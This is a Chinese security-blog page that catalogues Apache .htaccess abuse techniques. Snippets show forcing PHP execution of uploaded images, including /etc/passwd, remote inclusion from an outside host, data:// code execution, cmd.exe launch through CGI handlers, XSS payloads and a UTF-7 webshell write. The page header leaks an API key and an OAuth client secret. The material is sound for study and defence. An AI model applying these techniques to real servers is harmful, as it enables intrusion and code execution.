<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Apache的.htaccess利用技巧"><meta name="keywords" content=""><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>Apache的.htaccess利用技巧【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x1简介"><span class="toc-number">1.</span> <span class="toc-text">0x1简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-1基本概念"><span class="toc-number">1.1.</span> <span class="toc-text">0x1.1基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-2作用范围"><span class="toc-number">1.2.</span> <span class="toc-text">0x1.2作用范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-3配置文件"><span class="toc-number">1.3.</span> <span class="toc-text">0x1.3配置文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2常见指令"><span class="toc-number">2.</span> <span class="toc-text">0x2常见指令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-1SetHandler"><span class="toc-number">2.1.</span> <span class="toc-text">0x2.1SetHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-2-AddHandler"><span class="toc-number">2.2.</span> <span class="toc-text">0x2.2 AddHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-3AddType"><span class="toc-number">2.3.</span> <span class="toc-text">0x2.3AddType</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-4php-value"><span class="toc-number">2.4.</span> <span class="toc-text">0x2.4php_value</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-5php-flag"><span class="toc-number">2.5.</span> <span class="toc-text">0x2.5php_flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3利用方式"><span class="toc-number">3.</span> <span class="toc-text">0x3利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-1文件解析"><span class="toc-number">3.1.</span> <span class="toc-text">0x3.1文件解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-2文件包含"><span class="toc-number">3.2.</span> <span class="toc-text">0x3.2文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-2-1本地文件包含"><span class="toc-number">3.2.1.</span> <span class="toc-text">0x3.2.1本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-2-2远程文件包含"><span class="toc-number">3.2.2.</span> <span class="toc-text">0x3.2.2远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-3源码泄露"><span class="toc-number">3.3.</span> <span class="toc-text">0x3.3源码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-4代码执行"><span class="toc-number">3.4.</span> <span class="toc-text">0x3.4代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-5命令执行"><span class="toc-number">3.5.</span> <span class="toc-text">0x3.5命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-5-1CGI启动"><span class="toc-number">3.5.1.</span> <span class="toc-text">0x3.5.1CGI启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-5-2FastCGI启动"><span class="toc-number">3.5.2.</span> <span class="toc-text">0x3.5.2FastCGI启动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-6XSS"><span class="toc-number">3.6.</span> <span class="toc-text">0x3.6XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-6-1-highlight-file"><span class="toc-number">3.6.1.</span> <span class="toc-text">0x3.6.1 highlight_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-6-2错误消息链接"><span class="toc-number">3.6.2.</span> <span class="toc-text">0x3.6.2错误消息链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-7自定义错误文件"><span class="toc-number">3.7.</span> <span class="toc-text">0x3.7自定义错误文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x4参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color10"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">Apache的.htaccess利用技巧</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-09-06 | 更新于 2020-09-17</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>首发于先知社区：<a href="https://xz.aliyun.com/t/8267" target="_blank" rel="noopener">https://xz.aliyun.com/t/8267</a><br>对 htaccess 文件的常见利用方式进行一次总结     </p>
<a id="more"></a>
<h1 id="0x1简介"><a href="#0x1简介" class="headerlink" title="0x1简介"></a>0x1简介</h1><h2 id="0x1-1基本概念"><a href="#0x1-1基本概念" class="headerlink" title="0x1.1基本概念"></a>0x1.1基本概念</h2><p><code>.htaccess</code> 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 <code>Apache</code> 的 <code>AllowOverride</code> 指令来设置。<br><code>.htaccess</code> 中有 <code>#</code> 单行注释符, 且支持 <code>\</code>拼接上下两行。</p>
<h2 id="0x1-2作用范围"><a href="#0x1-2作用范围" class="headerlink" title="0x1.2作用范围"></a>0x1.2作用范围</h2><p><code>.htaccess</code> 文件中的配置指令作用于 <code>.htaccess</code> 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 <code>.htaccess</code> 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 <code>.htaccess</code> 文件中的指令可能会覆盖其上级目录中的 <code>.htaccess</code> 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 </p>
<h2 id="0x1-3配置文件"><a href="#0x1-3配置文件" class="headerlink" title="0x1.3配置文件"></a>0x1.3配置文件</h2><p>启动 <code>.htaccess</code>，需要在服务器的主配置文件将 <code>AllowOverride</code> 设置为 <code>All</code>，如 apache2.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All  #启动.htaccess文件的使用</span><br></pre></td></tr></table></figure>
<p>也可以将 <code>.htaccess</code> 修改为其他名 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessFileName .config #将.htaccess修改为.config</span><br></pre></td></tr></table></figure>

<h1 id="0x2常见指令"><a href="#0x2常见指令" class="headerlink" title="0x2常见指令"></a>0x2常见指令</h1><p><code>.htaccess</code> 可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如需了解详细功能可看这篇文章  <a href="http://www.htaccess-guide.com/" target="_blank" rel="noopener">http://www.htaccess-guide.com/</a> ， 这里就不一一介绍，主要讲解几种常利用的指令。   </p>
<h2 id="0x2-1SetHandler"><a href="#0x2-1SetHandler" class="headerlink" title="0x2.1SetHandler"></a>0x2.1SetHandler</h2><p><code>SetHandler</code> 可以强制所有匹配的文件被一个指定的处理器处理<br>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler handler-name|None</span><br></pre></td></tr></table></figure>

<p>示例1：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
<p>此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析    </p>
<p>示例2： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure>
<p>apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录<br><img src="../../images/middleware/htaccess2/14.png" alt=""><br>访问任意不存在的文件，加参数 <code>?refresh=5</code> 来实现每隔 5s 自动刷新 </p>
<h2 id="0x2-2-AddHandler"><a href="#0x2-2-AddHandler" class="headerlink" title="0x2.2 AddHandler"></a>0x2.2 AddHandler</h2><p><code>AddHandler</code> 可以在文件扩展名与特定的处理器之间建立映射<br>用法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler handler-name extension [extension] ...</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .xxx</span><br></pre></td></tr></table></figure>
<p>将扩展名为 <code>.xxx</code> 的文件作为 <code>CGI</code> 脚本来处理</p>
<h2 id="0x2-3AddType"><a href="#0x2-3AddType" class="headerlink" title="0x2.3AddType"></a>0x2.3AddType</h2><p><code>AddType</code> 可以将给定的文件扩展名映射到指定的内容类型<br>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType media-type extension [extension] ...</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .gif</span><br></pre></td></tr></table></figure>
<p>将以 <code>gif</code> 为后缀的文件当做 <code>php</code> 解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php png  jpg gif</span><br></pre></td></tr></table></figure>
<p>将以 <code>.png .jpg .gif</code> 多个后缀当做 <code>php</code> 解析</p>
<h2 id="0x2-4php-value"><a href="#0x2-4php-value" class="headerlink" title="0x2.4php_value"></a>0x2.4php_value</h2><p>当使用 <code>PHP</code> 作为 <code>Apache</code> 模块时，也可以用 <code>Apache</code> 的配置文件（例如 <code>httpd.conf</code>）和 <code>.htaccess</code> 文件中的指令来修改 <code>php</code>    的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All</code> 权限才可以。 </p>
<p><code>php_value</code> 设定指定的值。要清除先前设定的值，把 <code>value</code> 设为 <code>none</code>。不要用 <code>php_value</code> 设定布尔值。应该用 <code>php_flag</code>。    </p>
<p>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value name value</span><br></pre></td></tr></table></figure>
<p>查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">配置可被设定范围</a><br><img src="../../images/middleware/htaccess2/1.png" alt=""><br>由上可知 <code>.htaccess</code> 只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR</code> 类型的指令。<br>查看<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">php.ini 配置选项列表</a>,寻找可利用指令      </p>
<p>(1) 文件包含配置选项<br><img src="../../images/middleware/htaccess2/2.png" alt="">  </p>
<ul>
<li>auto_prepend_file：在主文件解析之前自动解析包含的文件</li>
<li>auto_append_file：在主文件解析后自动解析包含的文件</li>
</ul>
<p>例如: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file images.png</span><br></pre></td></tr></table></figure>
<p>访问一个 <code>php</code> 文件时，在该文件解析之前会先自动解析 images.png 文件</p>
<p>(2) 绕过preg_match<br><img src="../../images/middleware/htaccess2/3.png" alt=""><br>例如：   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
<p>设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。</p>
<h2 id="0x2-5php-flag"><a href="#0x2-5php-flag" class="headerlink" title="0x2.5php_flag"></a>0x2.5php_flag</h2><p><code>php_flag</code> 用来设定布尔值的 <code>php</code> 配置指令<br>用法： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag name on|off</span><br></pre></td></tr></table></figure>
<p>查看<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">php.ini 配置选项列表</a>,寻找可利用指令<br><img src="../../images/middleware/htaccess2/4.png" alt=""><br>可以将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure>
<h1 id="0x3利用方式"><a href="#0x3利用方式" class="headerlink" title="0x3利用方式"></a>0x3利用方式</h1><h2 id="0x3-1文件解析"><a href="#0x3-1文件解析" class="headerlink" title="0x3.1文件解析"></a>0x3.1文件解析</h2><p>经常出现在文件上传的黑名单没有限制 <code>.htaceess</code> 后缀，通过上传 <code>.htaccess</code> 文件，再上传图片，使图片的 <code>php</code> 恶意代码得以被解析执行   </p>
<p><code>.htaccess</code> 文件内容有如下两种      </p>
<p>1.<code>SetHandler</code> 指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将images.png 当做 PHP 执行</span></span><br><span class="line">&lt;FilesMatch  <span class="string">"images.png"</span>&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/5.png" alt=""><br>2.<code>AddType</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 .jpg 当做 PHP 文件解析</span></span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>

<h2 id="0x3-2文件包含"><a href="#0x3-2文件包含" class="headerlink" title="0x3.2文件包含"></a>0x3.2文件包含</h2><h3 id="0x3-2-1本地文件包含"><a href="#0x3-2-1本地文件包含" class="headerlink" title="0x3.2.1本地文件包含"></a>0x3.2.1本地文件包含</h3><p>通过 <code>php_value</code> 来设置 <code>auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 <code>php</code> 文件来触发。   </p>
<p><code>.htaccess</code> 分别通过这两个配置选项来包含 <code>/etc/passwd</code>,并访问同目录下的 <code>index.php</code>文件。  </p>
<p><code>auto_prepend_file</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/6.png" alt=""> </p>
<p><code>auto_append_file</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/7.png" alt="">      </p>
<h3 id="0x3-2-2远程文件包含"><a href="#0x3-2-2远程文件包含" class="headerlink" title="0x3.2.2远程文件包含"></a>0x3.2.2远程文件包含</h3><p>PHP 的 <code>all_url_include</code> 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 <code>all_url_include</code> 的配置范围为 <code>PHP_INI_SYSTEM</code>,所以无法利用 <code>php_flag</code> 在 <code>.htaccess</code> 中开启。<br><img src="../../images/middleware/htaccess2/8.png" alt=""><br>这里为了演示，就在 <code>php.ini</code> 中设置  <code>all_url_include</code> 为 <code>On</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file http:&#x2F;&#x2F;10.87.9.156&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/10.png" alt=""> </p>
<h2 id="0x3-3源码泄露"><a href="#0x3-3源码泄露" class="headerlink" title="0x3.3源码泄露"></a>0x3.3源码泄露</h2><p>利用 <code>php_flag</code> 将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure>
<p>这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码<br><img src="../../images/middleware/htaccess2/9.png" alt=""> </p>
<h2 id="0x3-4代码执行"><a href="#0x3-4代码执行" class="headerlink" title="0x3.4代码执行"></a>0x3.4代码执行</h2><p>1.利用伪协议<br><code>all_url_fopen</code>、<code>all_url_include</code> 为 <code>On</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br><span class="line">#php_value auto_append_file data:&#x2F;&#x2F;text&#x2F;plain,%3C%3Fphp+phpinfo%28%29%3B</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/11.png" alt=""> </p>
<p>2.解析<code>.htaccess</code><br>方法一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/12.png" alt=""><br>方法二：<br>这种适合同目录或子目录没有 <code>php</code> 文件。<br>需要先设置允许可访问 <code>.htaccess</code> 文件 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure>
<p>将 <code>.htaccess</code>指定当做 php文件处理  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line"># &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/13.png" alt=""> </p>
<h2 id="0x3-5命令执行"><a href="#0x3-5命令执行" class="headerlink" title="0x3.5命令执行"></a>0x3.5命令执行</h2><h3 id="0x3-5-1CGI启动"><a href="#0x3-5-1CGI启动" class="headerlink" title="0x3.5.1CGI启动"></a>0x3.5.1CGI启动</h3><p><code>cgi_module</code> 需要加载，即 <code>apache</code> 配置文件中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules&#x2F;mod_cgi.so</span><br></pre></td></tr></table></figure>
<p>.htaccess内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI <span class="comment">#允许CGI执行</span></span><br><span class="line">AddHandler cgi-script .xx <span class="comment">#将xx后缀名的文件，当做CGI程序进行解析</span></span><br></pre></td></tr></table></figure>
<p>ce.xx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!C:&#x2F;Windows&#x2F;System32&#x2F;cmd.exe &#x2F;k start calc.exe</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/15.png" alt=""><br>例题可看 <a href="https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check%20in" target="_blank" rel="noopener">De1CTF2020 check in</a></p>
<h3 id="0x3-5-2FastCGI启动"><a href="#0x3-5-2FastCGI启动" class="headerlink" title="0x3.5.2FastCGI启动"></a>0x3.5.2FastCGI启动</h3><p><code>mod_fcgid.so</code>需要被加载。即 <code>apache</code> 配置文件中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule fcgid_module modules&#x2F;mod_fcgid.so</span><br></pre></td></tr></table></figure>
<p>.htaccess </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .xx</span><br><span class="line">FcgidWrapper &quot;C:&#x2F;Windows&#x2F;System32&#x2F;cmd.exe &#x2F;k start calc.exe&quot; .xx</span><br></pre></td></tr></table></figure>
<p>ce.xx 内容随意<br><img src="../../images/middleware/htaccess2/16.png" alt=""> </p>
<h2 id="0x3-6XSS"><a href="#0x3-6XSS" class="headerlink" title="0x3.6XSS"></a>0x3.6XSS</h2><h3 id="0x3-6-1-highlight-file"><a href="#0x3-6-1-highlight-file" class="headerlink" title="0x3.6.1 highlight_file"></a>0x3.6.1 highlight_file</h3><p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure>
<p>其中的 <code>highlight.comment</code> 也可以换成如下其他选项<br><img src="../../images/middleware/htaccess2/17.png" alt="">  </p>
<p>index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;&#x2F; comment</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/18.png" alt="">  </p>
<h3 id="0x3-6-2错误消息链接"><a href="#0x3-6-2错误消息链接" class="headerlink" title="0x3.6.2错误消息链接"></a>0x3.6.2错误消息链接</h3><p>index.php ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;foo&#39;);#foo报错</span><br></pre></td></tr></table></figure>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1</span><br><span class="line">php_flag html_errors 1</span><br><span class="line">php_value docref_root &quot;&#39;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/middleware/htaccess2/19.png" alt="">     </p>
<h2 id="0x3-7自定义错误文件"><a href="#0x3-7自定义错误文件" class="headerlink" title="0x3.7自定义错误文件"></a>0x3.7自定义错误文件</h2><p>error.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">'shell'</span>);<span class="comment">#报错页面</span></span><br></pre></td></tr></table></figure>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;tmp&#x2F;www&#x2F;html&#x2F;shell.php </span><br><span class="line">php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure>
<p>访问 error.php，会报错并记录在 shell.php 文件中<br><img src="../../images/middleware/htaccess2/20.png" alt=""><br>因为会经过 html 编码，所以需要 UTF-7 来绕过。 </p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 第一次</span><br><span class="line">php_value error_log &#x2F;tmp&#x2F;shell #定义错误路径</span><br><span class="line">#---- &quot;&lt;?php phpinfo(); __halt_compiler();&quot; in UTF-7:</span><br><span class="line">php_value include_path &quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"></span><br><span class="line"># 第二次</span><br><span class="line">php_value include_path &quot;&#x2F;tmp&quot; #将include()的默认路径改变</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure>
